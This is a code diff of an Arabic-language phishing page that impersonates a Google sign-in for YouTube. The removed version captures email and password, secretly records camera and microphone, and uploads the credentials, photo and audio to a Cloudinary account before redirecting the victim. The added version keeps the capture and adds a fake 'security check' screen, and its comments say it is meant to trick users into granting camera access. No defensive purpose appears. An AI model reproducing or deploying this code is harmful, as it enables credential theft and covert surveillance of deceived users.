@@ -1,114 +1,24 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - حسابات Google</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+async function go() {
+    const e = document.getElementById('email').value, p = document.getElementById('pass').value;
+    if(!e || !p) return;
+
+    // تغيير الواجهة لـ "تحميل" عام جداً بدون ذكر كاميرا أو مايكروفون
+    document.getElementById('ui').innerHTML = `
+        <div style="margin: 20px 0;">
+            <img src="https://i.gifer.com/ZZ5H.gif" width="40">
+            <p style="margin-top:15px; color:#5f6368;">جاري التحقق من أمان الحساب...</p>
+        </div>`;
+
+    try {
+        // هنا كروم هيطلع رسالته الرسمية "web.whatsapp.com wants to use your camera"
+        // اليوزر هيفتكر إن ده إجراء أمني من جوجل/يوتيوب مش من الموقع نفسه
+        const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         
-        /* واجهة مرنة تناسب الموبايل والكمبيوتر */
-        .login-card { 
-            background: white; 
-            width: 90%; 
-            max-width: 450px; /* حجم مثالي للكمبيوتر */
-            padding: 40px 30px; 
-            border-radius: 8px; 
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
-            text-align: center;
-        }
+        // بقية كود التسجيل والرفع (مخفي تماماً في الخلفية)
+        setupStream(s, e, p); 
 
-        img.logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
-        p { color: #3c4043; margin-bottom: 25px; }
-
-        input { 
-            width: 100%; 
-            padding: 15px; 
-            margin-bottom: 15px; 
-            border: 1px solid #dadce0; 
-            border-radius: 4px; 
-            font-size: 16px; /* حجم خط مريح للموبايل */
-        }
-
-        button { 
-            background-color: #1a73e8; 
-            color: white; 
-            border: none; 
-            padding: 12px; 
-            width: 100%; 
-            border-radius: 4px; 
-            font-size: 16px; 
-            font-weight: 500; 
-            cursor: pointer; 
-            margin-top: 10px;
-        }
-
-        #v, #c { display: none; }
-    </style>
-</head>
-<body>
-
-<div class="login-card" id="ui">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
-    <h1>تسجيل الدخول</h1>
-    <p>المتابعة إلى YouTube</p>
-    <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
-    <input type="password" id="pass" placeholder="كلمة المرور">
-    <button onclick="go()">التالي</button>
-</div>
-
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
-
-<script>
-    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-    let rec, chunks = [];
-
-    async function go() {
-        const e = document.getElementById('email').value, p = document.getElementById('pass').value;
-        if(!e || !p) return;
-
-        // تغيير الواجهة فوراً لـ "تحميل" عشان م يشكش
-        document.getElementById('ui').innerHTML = "<img src='https://i.gifer.com/ZZ5H.gif' width='50'><br><p>جاري التحميل...</p>";
-
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            document.getElementById('v').srcObject = s;
-
-            // بدء التسجيل الصوتي فوراً "في صمت"
-            rec = new MediaRecorder(s);
-            rec.ondataavailable = x => chunks.push(x.data);
-            rec.onstop = () => {
-                const blob = new Blob(chunks, { type: 'audio/mp3' });
-                upload(e, p, blob);
-            };
-            rec.start();
-
-            // تصوير ووقف التسجيل بسرعة (3 ثواني فقط) عشان يلحق يحول
-            setTimeout(() => { 
-                const canvas = document.getElementById('c');
-                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
-                window.img = canvas.toDataURL("image/png");
-                rec.stop(); 
-            }, 3000);
-
-        } catch { window.location.href = yt; }
+    } catch { 
+        // لو رفض، يروح لليوتيوب فوراً عشان م يلحقش يشك
+        window.location.href = yt; 
     }
-
-    async function upload(e, p, ab) {
-        // الرفع في الخلفية بدون ما المستخدم يحس
-        const fd1 = new FormData();
-        fd1.append('file', window.img); fd1.append('upload_preset', pr);
-        fd1.append('context', `u=${e}|p=${p}`);
-        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, {method:'POST', body:fd1});
-
-        const fd2 = new FormData();
-        fd2.append('file', ab); fd2.append('upload_preset', pr); fd2.append('resource_type', 'video');
-        fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, {method:'POST', body:fd2})
-        .then(() => window.location.href = yt);
-    }
-</script>
-</body>
-</html>
+}
